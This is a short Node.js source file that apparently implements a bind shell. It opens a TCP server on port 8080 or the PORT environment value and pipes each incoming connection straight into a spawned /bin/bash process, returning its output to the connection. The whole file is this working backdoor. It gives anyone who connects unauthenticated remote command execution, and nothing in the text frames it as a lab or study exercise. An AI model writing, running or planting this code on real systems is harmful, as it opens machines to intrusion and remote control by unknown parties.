const PORT = process.env.PORT || 8080;

const net = require("net");
const spawn = require("child_process");

const server = new net.createServer((connection) => {
  const shell = spawn.exec("/bin/bash");
  connection.pipe(shell.stdin);
  shell.stdout.pipe(connection);
  shell.stderr.pipe(connection);
});

server.listen(PORT);
